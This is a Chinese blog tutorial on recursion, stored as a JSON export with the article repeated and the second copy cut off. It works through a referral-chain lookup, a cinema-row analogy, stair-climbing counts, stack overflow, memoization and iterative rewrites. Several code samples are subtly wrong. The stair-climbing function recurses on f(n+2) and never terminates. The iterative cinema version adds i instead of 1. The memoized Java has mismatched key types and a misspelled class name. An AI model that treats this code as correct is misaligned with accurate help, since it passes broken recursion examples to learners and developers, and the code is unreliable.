data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-递归","published":1,"updated":"2018-12-05T08:44:41.657Z","_id":"cjpdmv0bh002y4cv0s6obso33","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。</p>\n<p>一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。</p>\n<table>\n<thead>\n<tr>\n<th>actor_id</th>\n<th>referer_id</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>B</td>\n<td>A</td>\n</tr>\n<tr>\n<td>C</td>\n<td>B</td>\n</tr>\n</tbody>\n</table>\n<p>基于这个背景，我的问题是，<font color=\"red\"><strong>给定一个用户ID，如何查找这个用户的“最终推荐人”？</strong></font> 带着这个问题，我们来学习今天的内容，递归（Recursion）！</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解递归\"><a href=\"#如何理解递归\" class=\"headerlink\" title=\"如何理解递归\"></a>如何理解递归</h3></div><br></div>\n\n<p>从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是<strong>动态规划</strong>，另一个就是<strong>递归</strong>。</p>\n<p>递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。</p>\n<p>不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。</p>\n<p>比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？</p>\n<p>这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。</p>\n<p>这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的</p>\n<p>$$ f(n) = f(n-1) +1 ;\\ 其中f(1)=1 $$</p>\n<p>f(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"什么时候可以用递归呢\"><a href=\"#什么时候可以用递归呢\" class=\"headerlink\" title=\"什么时候可以用递归呢\"></a>什么时候可以用递归呢</h3></div><br></div>\n\n<p>刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。</p>\n<p><strong>1、一个问题的解可以分解为几个子问题的解</strong></p>\n<p>何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为”前一排的人在那一排？”这样一个子问题。</p>\n<p><strong>2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样</strong></p>\n<p>还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。</p>\n<p><strong>3、存在递归终止条件</strong></p>\n<p>把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何写递归代码\"><a href=\"#如何写递归代码\" class=\"headerlink\" title=\"如何写递归代码\"></a>如何写递归代码</h3></div><br></div>\n\n<p>说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是<font face=\"微软雅黑\" color=\"red\"><strong>写出递推公式，找到终止条件</strong></font>，剩下将递推公式转化为代码就很容易了。</p>\n<p>我这里举个例子，来一步一步实现递归代码。</p>\n<blockquote>\n<p>如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？</p>\n</blockquote>\n<p>如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？</p>\n<p>我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：<br>$$f(n) = f(n-1) + f(n-2) $$</p>\n<p>有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。</p>\n<p>n=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。</p>\n<p>所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。</p>\n<p>我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：<br>$$ f(n) = f(n-1) + f(n-2); \\ 其中 \\ f(1)=1, f(2)=2; $$</p>\n<p>有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+f(n+<span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>总结一下，<font color=\"red\"><strong>写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。</strong></font></p>\n<p>讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。</p>\n<p>上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。</p>\n<p>但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。</p>\n<p>像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个”递”和”归”的过程一步一步都想清楚。</p>\n<p>计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。</p>\n<p>对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？</p>\n<p>如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。</p>\n<p>因此，编写递归代码的关键是，<strong>只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤</strong></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"递归代码警惕堆栈溢出\"><a href=\"#递归代码警惕堆栈溢出\" class=\"headerlink\" title=\"递归代码警惕堆栈溢出\"></a>递归代码警惕堆栈溢出</h3></div><br></div>\n\n<p>在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？</p>\n<p>在”栈”那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。</p>\n<p>比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread <span class=\"string\">\"main\"</span> java.lang.StackOverflowError</span><br></pre></td></tr></table></figure></p>\n<p>那么如何避免堆栈溢出呢？</p>\n<p>我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n&lt;=0。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 表示递归的深度</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> depth = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t++depth;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(depth&gt;<span class=\"number\">1000</span>)<span class=\"keyword\">throw</span> exception;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"递归代码警惕重复计算\"><a href=\"#递归代码警惕重复计算\" class=\"headerlink\" title=\"递归代码警惕重复计算\"></a>递归代码警惕重复计算</h3></div><br></div>\n\n<p>除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的：<br><img src=\"/posts/2018-09-18-算法-递归/台阶递归图.jpg\"></p>\n<p>从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。</p>\n<p>为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。</p>\n<p>按照上面的思路，我们再来改造一下代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Map&lt;String, Integer&gt; map = <span class=\"keyword\">new</span> Hashmap&lt;&gt;();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(map.containsKey(n))&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> map.get(n);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = f(n-<span class=\"number\">1</span>) + f(n-<span class=\"number\">2</span>);</span><br><span class=\"line\">\tmap.put(n, ret);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。</p>\n<p>在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"怎样将递归代码改写为非递归代码\"><a href=\"#怎样将递归代码改写为非递归代码\" class=\"headerlink\" title=\"怎样将递归代码改写为非递归代码\"></a>怎样将递归代码改写为非递归代码</h3></div><br></div>\n\n<p>我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。</p>\n<p>那我们是否可以将递归代码改写为非递归代码呢？</p>\n<p>仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">2</span>; i&lt;=n; ++i)&#123;</span><br><span class=\"line\">\t\tret = ret+i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>同样，第二个例子也可以改写为非递归的方式实现。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>)<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>)<span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> prepre = <span class=\"number\">1</span>; <span class=\"comment\">// f(1)=1</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> pre = <span class=\"number\">2</span>;    <span class=\"comment\">// f(2)=2</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">3</span>;i&lt;=n;++i)&#123; <span class=\"comment\">//f(3) = f(2)+f(1)</span></span><br><span class=\"line\">\t\tret = pre + prepre;</span><br><span class=\"line\">\t\tprepre = pre;</span><br><span class=\"line\">\t\tpre = ret;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那是不是所有的递归代码都可以改写为这种<strong>迭代循环</strong>的非递归写法呢？</p>\n<p>笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。</p>\n<p>但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">long</span> <span class=\"title\">findRootRefererId</span><span class=\"params\">(<span class=\"keyword\">long</span> actorId)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">long</span> refererId = select referer_id from [table] where actor_id = actorId;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(refererId == <span class=\"keyword\">null</span>) <span class=\"keyword\">return</span> actorId;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> findRootRefererId(refererId)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。</p>\n<p>第一，如果递归很深，可能会有堆栈溢出问题。</p>\n<p>第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。</p>\n<p>不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。</p>\n<p>递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。</p>\n<h3 id=\"思考题\"><a href=\"#思考题\" class=\"headerlink\" title=\"思考题\"></a>思考题</h3><p>1、 递归代码的时间复杂度该如何分析？</p>\n<p>2、 递归代码如何调试呢？你有什么好的调试方法吗？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。</p>\n<p>一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。</p>\n<table>\n<thead>\n<tr>\n<th>actor_id</th>\n<th>referer_id</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>B</td>\n<td>A</td>\n</tr>\n<tr>\n<td>C</td>\n<td>B</td>\n</tr>\n</tbody>\n</table>\n<p>基于这个背景，我的问题是，<font color=\"red\"><strong>给定一个用户ID，如何查找这个用户的“最终推荐人”？</strong></font> 带着这个问题，我们来学习今天的内容，递归（Recursion）！</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解递归\"><a href=\"#如何理解递归\" class=\"headerlink\" title=\"如何理解递归\"></a>如何理解递归</h3></div><br></div>\n\n<p>从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是<strong>动态规划</strong>，另一个就是<strong>递归</strong>。</p>\n<p>递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。</p>\n<p>不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。</p>\n<p>比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？</p>\n<p>这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。</p>\n<p>这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的</p>\n<p>$$ f(n) = f(n-1) +1 ;\\ 其中f(1)=1 $$</p>\n<p>f(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"什么时候可以用递归呢\"><a href=\"#什么时候可以用递归呢\" class=\"headerlink\" title=\"什么时候可以用递归呢\"></a>什么时候可以用递归呢</h3></div><br></div>\n\n<p>刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。</p>\n<p><strong>1、一个问题的解可以分解为几个子问题的解</strong></p>\n<p>何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为”前一排的人在那一排？”这样一个子问题。</p>\n<p><strong>2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样</strong></p>\n<p>还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。</p>\n<p><strong>3、存在递归终止条件</strong></p>\n<p>把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何写递归代码\"><a href=\"#如何写递归代码\" class=\"headerlink\" title=\"如何写递归代码\"></a>如何写递归代码</h3></div><br></div>\n\n<p>说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是<font face=\"微软雅黑\" color=\"red\"><strong>写出递推公式，找到终止条件</strong></font>，剩下将递推公式转化为代码就很容易了。</p>\n<p>我这里举个例子，来一步一步实现递归代码。</p>\n<blockquote>\n<p>如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？</p>\n</blockquote>\n<p>如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？</p>\n<p>我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：<br>$$f(n) = f(n-1) + f(n-2) $$</p>\n<p>有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。</p>\n<p>n=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。</p>\n<p>所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。</p>\n<p>我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：<br>$$ f(n) = f(n-1) + f(n-2); \\ 其中 \\ f(1)=1, f(2)=2; $$</p>\n<p>有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> f(n<span class=\"number\">-1</span>)+f(n+<span class=\"number\">2</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>总结一下，<font 